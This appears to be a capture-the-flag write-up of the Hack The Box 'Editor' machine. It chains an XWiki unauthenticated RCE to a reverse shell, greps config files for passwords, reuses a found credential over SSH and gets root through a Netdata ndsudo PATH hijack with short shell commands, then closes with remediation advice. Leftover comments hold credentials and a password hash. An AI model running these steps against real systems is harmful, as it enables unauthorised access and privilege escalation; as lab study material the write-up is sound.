> This is a write-up for Editor HTB machine.
> We'll give recommendations to secure the machine

# Reconnaissance

1. Scan with nmap: 

```sh
$ sudo nmap -sC -sV -O -A --min-rate=2000 -p- 10.10.11.80 > scan.nmap
```

[Results](scan.nmap) tells us ssh is open on port 22, as well as 3 http services on port `80`, `8080` and `9091`. `80` is for an nginx showcase website, `8080` is some documentation running on Jetty, and `9091` is a python http server. The last one was then closed, so was probably started by another player, since I don't have the premium version.

2. Add `editor.htb` to our `/etc/hosts`.

When searching for any CVE on `Jetty 10.0.20`, there was only a DOS vulnerability in 2024 (`CVE-2024-22201`). `nginx 1.18.0` seems to be vulnerable to `CVE-2021-23017`, an off-by one error allowing RCE. Let's see if metasploit has an exploit for that CVE. While metasploit doesn't have module for this, we found the following exploit [](https://github.com/M507/CVE-2021-23017-PoC). However, it doesn't look like we went in the right direction. Focusing on the `XWiki` doc, we found that `CVE-2025-24893` allows "Unauthenticated RCE". The version running is `15.10.8`, so it's indeed vulnerable. [This website](https://dollarboysushil.com/posts/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC/) explains how the vulnerability works very well. Here's [the PoC](https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC). Using the exploit, we can get a reverse shell:

```
$ whoami
xwiki
```

We don't have access the `/home/oliver` directory, that probably contains the user flag. Let's search for some passwords that could be contained [in the file system](hibernate.xml):

```sh
$ find / -name "*.xml" 2>/dev/null | xargs grep -i "password"
[...]
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

If we try the password using `mysql`, the prompt freezes, which is not the case with other credentials that raise an error. 


<!-- $ cd root
$ ls
META-INF
robots.txt
WEB-INF
$ cat robots.txt
User-agent: *
# Prevent bots from executing all actions except "view" and
# "download" since:
# 1) we don't want bots to execute stuff in the wiki by
#    following links! (for example delete pages, add comments,
#    etc)
# 2) we don't want bots to consume CPU and memory
#   (for example to perform exports)
Disallow: /xwiki/bin/viewattachrev/
Disallow: /xwiki/bin/viewrev/
Disallow: /xwiki/bin/pdf/
Disallow: /xwiki/bin/edit/
Disallow: /xwiki/bin/create/
Disallow: /xwiki/bin/inline/
Disallow: /xwiki/bin/preview/
Disallow: /xwiki/bin/save/
Disallow: /xwiki/bin/saveandcontinue/
Disallow: /xwiki/bin/rollback/
Disallow: /xwiki/bin/deleteversions/
Disallow: /xwiki/bin/cancel/
Disallow: /xwiki/bin/delete/
Disallow: /xwiki/bin/deletespace/
Disallow: /xwiki/bin/undelete/
Disallow: /xwiki/bin/reset/
Disallow: /xwiki/bin/register/
Disallow: /xwiki/bin/propupdate/
Disallow: /xwiki/bin/propadd/
Disallow: /xwiki/bin/propdisable/
Disallow: /xwiki/bin/propenable/
Disallow: /xwiki/bin/propdelete/
Disallow: /xwiki/bin/objectadd/
Disallow: /xwiki/bin/commentadd/
Disallow: /xwiki/bin/commentsave/
Disallow: /xwiki/bin/objectsync/
Disallow: /xwiki/bin/objectremove/
Disallow: /xwiki/bin/attach/
Disallow: /xwiki/bin/upload/
Disallow: /xwiki/bin/temp/
Disallow: /xwiki/bin/downloadrev/
Disallow: /xwiki/bin/dot/
Disallow: /xwiki/bin/delattachment/
Disallow: /xwiki/bin/skin/
Disallow: /xwiki/bin/jsx/
Disallow: /xwiki/bin/ssx/
Disallow: /xwiki/bin/login/
Disallow: /xwiki/bin/loginsubmit/
Disallow: /xwiki/bin/loginerror/
Disallow: /xwiki/bin/logout/
Disallow: /xwiki/bin/lock/
Disallow: /xwiki/bin/redirect/
Disallow: /xwiki/bin/admin/
Disallow: /xwiki/bin/export/
Disallow: /xwiki/bin/import/
Disallow: /xwiki/bin/get/
Disallow: /xwiki/bin/distribution/
Disallow: /xwiki/bin/jcaptcha/
Disallow: /xwiki/bin/unknown/
Disallow: /xwiki/bin/webjars/ -->




<!-- efb12e25-6ba5-4d01-a530-445d648fa232 -->

<!-- In `/var/lib/xwiki/data/mails/`

`neal:cacaca` -->

If we try to connect through `ssh` using the following credentials, it works: `oliver:theEd1t0rTeam99`.From there, we can get the user flag. We are part of `netdata` group. Let's search for some priviledge escalation vulnerability with netstat. The `CVE-2024-32019` enables executing code as root (https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93). We can then create a file containing the command we want to execute as root, let's say `cat /root/root.txt`. The file need to be named as one of possible executable names searched by `ndsudo`, like `nvme`. Then we can specify the directory containing as the path when executing  `ndsudo`: 

```sh
$ echo "cat /root/root.txt" > /tmp/nvme
$ PATH=/tmp ./ndsudo nvme-list
```

We got the root flag.

<!-- 
$ mysql -u xwiki -ptheEd1t0rTeam99
mysql: [Warning] Using a password on the command line interface can be insecure. -->

<!-- `./linpeas.sh` or `python3 LinPEAS.py` -->


<!-- 
```sh
$ mysql -u xwiki -ptheEd1t0rTeam99
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1784
Server version: 8.0.42-0ubuntu0.22.04.2 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

```
mysql> SELECT user, host, plugin, authentication_string
    -> FROM mysql.user
    -> WHERE user = 'debian-sys-maint';
+------------------+-----------+-----------------------+------------------------------------------------------------------------+
| user             | host      | plugin                | authentication_string                                                  |
+------------------+-----------+-----------------------+------------------------------------------------------------------------+
| debian-sys-maint | localhost | caching_sha2_password | $A$005$Fohc\77S]v3@
*sj
   --Hg3U311hw2L7LkCsuX.ARUs35Lrib/Bax4bKLKVa2KD |
+------------------+-----------+-----------------------+------------------------------------------------------------------------+
```


`$A$005$Fohc\77S]v3@*sj --Hg3U311hw2L7LkCsuX.ARUs35Lrib/Bax4bKLKVa2KD` -->



# Recommendations

1. XWiki `15.10.8` has an RCE vulnerability for non authenticated used. It is necessary to update XWiki, to version `15.10.11` at least. 

2. Remove sensitive information from `/etc/xwiki/hibernate.cfg.xml`

3. Remove `oliver` from `netdata` group if non necessary.

4. `netdata` has a local priviledge escalation vulnerability. It should be upgraded to version `1.45.3`.

# CVEs

1. CVE-2025-24893

2. CVE-2024-32019